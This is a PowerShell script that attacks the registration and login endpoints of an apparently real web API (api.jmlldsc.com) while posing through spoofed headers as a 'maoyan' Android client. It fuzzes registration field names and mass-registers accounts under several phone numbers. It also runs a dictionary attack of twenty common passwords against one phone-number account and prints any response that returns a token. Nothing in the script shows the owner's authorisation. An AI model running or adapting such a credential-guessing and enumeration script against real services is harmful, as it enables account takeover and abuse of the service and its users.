$headers = @{
    'client-device' = 'test-device'
    'client-version' = '1.0.0'
    'client-brand' = 'android'
    'client-source' = 'maoyan'
    'client-name' = 'maoyan'
}
# Test 1: Password confirmation as header
Write-Host "=== Test: confirmPassword as header ==="
$regHeaders = $headers.Clone()
$regHeaders['confirmPassword'] = 'Test123456'
$body1 = '{"passport":"13800138000","password":"Test123456"}'
try {
    $r = Invoke-WebRequest -Uri 'http://api.jmlldsc.com/auth/register' -Method POST -ContentType 'application/json' -Headers $regHeaders -Body $body1 -UseBasicParsing -TimeoutSec 10
    Write-Host "Header: $($r.Content)"
} catch {
    if ($_.Exception.Response) {
        $sr = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
        Write-Host "Header Error: $($sr.ReadToEnd())"
    } else { Write-Host "Error: $($_.Exception.Message)" }
}

# Test 2: Try different passport field names
Write-Host "`n=== Test: Different passport field names ==="
$passportNames = @('phone', 'mobile', 'tel', 'account', 'username', 'user', 'email', 'loginName', 'loginAccount', 'phoneNumber', 'cellphone')
foreach ($name in $passportNames) {
    $body = "{`"$name`":`"13800138000`",`"password`":`"Test123456`",`"confirmPassword`":`"Test123456`"}"
    try {
        $r = Invoke-WebRequest -Uri 'http://api.jmlldsc.com/auth/register' -Method POST -ContentType 'application/json' -Headers $headers -Body $body -UseBasicParsing -TimeoutSec 5
        $resp = $r.Content
        if ($resp -notmatch 'confirmPassword') {
            Write-Host "FIELD $name => DIFFERENT: $($resp.Substring(0, [Math]::Min(200, $resp.Length)))"
        }
    } catch {
        if ($_.Exception.Response) {
            $sr = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
            $resp = $sr.ReadToEnd()
            if ($resp -notmatch 'confirmPassword') {
                Write-Host "FIELD $name => DIFFERENT: $($resp.Substring(0, [Math]::Min(200, $resp.Length)))"
            }
        }
    }
}

# Test 3: Try login with different passwords
Write-Host "`n=== Test: Login with common passwords ==="
$commonPasswords = @('123456', 'password', '12345678', 'qwerty', 'abc123', '111111', '123123', 'admin', 'letmein', 'maoyan123', 'maoyan', 'test123', 'test1234', 'a123456', '123456789', '1234567890', '000000', '654321', '123321', 'admin123')
foreach ($pwd in $commonPasswords) {
    $body = "{`"account`":`"13800138000`",`"password`":`"$pwd`"}"
    try {
        $r = Invoke-WebRequest -Uri 'http://api.jmlldsc.com/auth/login' -Method POST -ContentType 'application/json' -Headers $headers -Body $body -UseBasicParsing -TimeoutSec 5
        $resp = $r.Content
        if ($resp -match '"token"') {
            Write-Host "PASSWORD $pwd => SUCCESS: $($resp.Substring(0, [Math]::Min(300, $resp.Length)))"
        } elseif ($resp -notmatch '密码错误') {
            Write-Host "PASSWORD $pwd => DIFFERENT: $($resp.Substring(0, [Math]::Min(200, $resp.Length)))"
        }
    } catch {
        if ($_.Exception.Response) {
            $sr = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
            $resp = $sr.ReadToEnd()
            if ($resp -match '"token"') {
                Write-Host "PASSWORD $pwd => SUCCESS: $($resp.Substring(0, [Math]::Min(300, $resp.Length)))"
            } elseif ($resp -notmatch '密码错误') {
                Write-Host "PASSWORD $pwd => DIFFERENT: $($resp.Substring(0, [Math]::Min(200, $resp.Length)))"
            }
        }
    }
}

# Test 4: Try register with just passport+password (no confirmation) using different phone numbers
Write-Host "`n=== Test: Register new accounts ==="
$newPhones = @('13900139000', '13700137000', '15012345678', '18888888888')
foreach ($phone in $newPhones) {
    $body = "{`"passport`":`"$phone`",`"password`":`"Test123456`"}"
    try {
        $r = Invoke-WebRequest -Uri 'http://api.jmlldsc.com/auth/register' -Method POST -ContentType 'application/json' -Headers $headers -Body $body -UseBasicParsing -TimeoutSec 5
        Write-Host "Phone $phone => $($r.Content)"
    } catch {
        if ($_.Exception.Response) {
            $sr = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
            Write-Host "Phone $phone => $($sr.ReadToEnd())"
        }
    }
}